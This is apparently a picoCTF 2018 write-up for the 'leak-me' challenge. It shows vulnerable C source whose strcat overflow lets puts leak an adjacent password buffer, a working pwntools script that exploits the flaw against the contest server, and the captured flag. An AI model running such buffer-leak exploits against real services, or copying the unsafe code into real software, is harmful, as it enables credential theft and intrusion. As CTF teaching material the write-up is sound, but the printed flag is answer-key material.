# leak-me
**Points: 200**

## Binary Exploitation

## Question
>Can you authenticate to this service and get the flag? Connect with nc 2018shell.picoctf.com 23685. Source.

### Hint
>Are all the system calls being used safely?
>Some people can have reallllllly long names you know..

## Solution

Let's check the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```
The name variable is set using a strange method:
```c
fgets(name, sizeof(name), stdin);
char *end = strchr(name, '\n');
if (end != NULL) {
  *end = '\x00';
}
```
Using strchr the character '\n' is searched, but what appends if the program doesn't find '\n'? The end char of name won't be '\x00'
On the next line we have:
```c
strcat(name, ",\nPlease Enter the Password.");
```
The program concats our name to that string without checking the length, so the variable name won't have the end char '\x00' so we'll be able to leak the content of the next variable:
`puts(name);`
This is because puts will print until '\0'

```python
#!/usr/bin/python3
from pwn import *

p = remote("2018shell.picoctf.com", 23685, level='error')
passwordValue = 'A'*256
p.recvuntil('name?\n')
p.sendline('A'*256)
p.recvuntil(',')
password = p.recvline()
p.close()

p = remote("2018shell.picoctf.com", 23685)
p.recvuntil('name?\n')
p.sendline('manulqwerty')
p.recvuntil('Password.\n')
p.sendline(password)
print(p.recvline().decode('utf-8'))
p.close()
```

![alt text](https://github.com/manulqwerty/picoCTF-2018-WriteUp/blob/master/Binary%20Exploitation/leak%20me/images/1.png)

### Flag
`picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_ee6111c9}`
